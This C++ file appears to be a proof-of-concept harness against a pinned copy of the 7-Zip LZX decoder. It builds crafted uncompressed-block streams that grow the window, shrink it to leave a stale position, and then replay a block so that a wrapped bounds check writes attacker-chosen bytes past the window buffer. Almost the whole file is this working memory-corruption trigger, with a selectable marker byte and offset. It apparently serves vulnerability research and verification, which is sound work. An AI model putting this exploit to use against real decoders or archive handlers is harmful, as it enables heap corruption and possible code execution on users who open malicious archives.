// Frontier differential harness: pinned 7-Zip LZX decoder window desync.
// Calls only the public API of the verbatim pinned LzxDecoder.{h,cpp}.
// No upstream source file is modified.
#include "StdAfx.h"
#include "LzxDecoder.h"
#include <stdio.h>
#include <string.h>
#include <vector>
#include <stdlib.h>

using namespace NCompress::NLzx;

// Standard LZX bit words: little-endian 16-bit, stream bits from MSB of the
// high byte first (pinned CBitDecoder at bitOffset == -16 mod 16).
static void PutBits(unsigned char *dst, unsigned bitPos, unsigned value, unsigned numBits)
{
  for (unsigned i = 0; i < numBits; i++)
  {
    const unsigned p = bitPos + i, w = p >> 4, q = p & 15;
    dst[2 * w + 1 - (q >> 3)] |= (unsigned char)(((value >> (numBits - 1 - i)) & 1) << (7 - (q & 7)));
  }
}

// Uncompressed LZX block header: 3-bit type, 24-bit size as high16 | low8,
// then 4 pad bits. No x86 flag: keepHistory is set before the first call.
static void PutBlockHeader(void (*put)(unsigned char *, unsigned, unsigned, unsigned),
                           unsigned char *dst, UInt32 size)
{
  put(dst, 0, 3, 3);                  // kBlockType_Uncompressed
  put(dst, 3, size >> 8, 16);
  put(dst, 19, size & 0xff, 8);
}

int main(int argc, char **argv)
{
  const UInt32 growBits = 21;         // 2 MiB window, as in the public writeup
  const UInt32 shrinkBits = 15;       // 32 KiB window, as in the public writeup
  const UInt32 stalePos = argc > 2 ? (UInt32)strtoul(argv[2], NULL, 0) : 0x14A420u;
  const UInt32 replayOut = 4096;
  const unsigned char marker = argc > 1 ? (unsigned char)atoi(argv[1]) : 0x41;

  // Phase 1: the pinned decoder itself advances _pos via a real huge block.
  std::vector<unsigned char> first(16 + stalePos, 0);
  PutBlockHeader(PutBits, first.data(), stalePos);
  for (unsigned i = 0; i < 3; i++) first[4 + i * 4] = 1;
  memset(first.data() + 16, marker, stalePos);
  const size_t n1 = first.size();

  CDecoder dec;
  dec._pos = 0;                       // vulnerable constructor leaves it unset
  dec.Set_KeepHistory(true);
  HRESULT r0 = dec.Set_DictBits_and_Alloc(growBits);
  HRESULT r1 = dec.Code_WithExceedReadWrite(first.data(), n1, stalePos);
  printf("PHASE1 set=0x%x decode=0x%x pos=%u winSize=%u bytes=%zu\n",
      (unsigned)r0, (unsigned)r1, dec._pos, dec._winSize, n1);
  fflush(stdout);

  // Phase 2: shrinking the window leaves a stale _pos in the vulnerable pin.
  HRESULT r2 = dec.Set_DictBits_and_Alloc(shrinkBits);
  printf("PHASE2 set=0x%x pos=%u winSize=%u overDict=%d\n",
      (unsigned)r2, dec._pos, dec._winSize, (int)dec._overDict);
  fflush(stdout);
  if (r2 != S_OK) return 3;

  // Phase 3: CodeSpec switches the retained byte-mode stream back to bit
  // mode, so a fresh standard uncompressed header is read at h. The wrapped
  // bounds check then drives a write at win + stalePos.
  first.resize(n1 + 16 + replayOut, 0);
  unsigned char *h = first.data() + n1 - 2;
  memset(h, 0, 4);
  PutBlockHeader(PutBits, h, replayOut);
  for (unsigned i = 0; i < 3; i++) h[4 + i * 4] = 1;
  memset(h + 16, marker, replayOut);

  HRESULT r3 = dec.Code_WithExceedReadWrite(h, 4114, replayOut);
  printf("PHASE3 decode=0x%x pos=%u winSize=%u marker=%02x\n",
      (unsigned)r3, dec._pos, dec._winSize, marker);
  return 0;
}
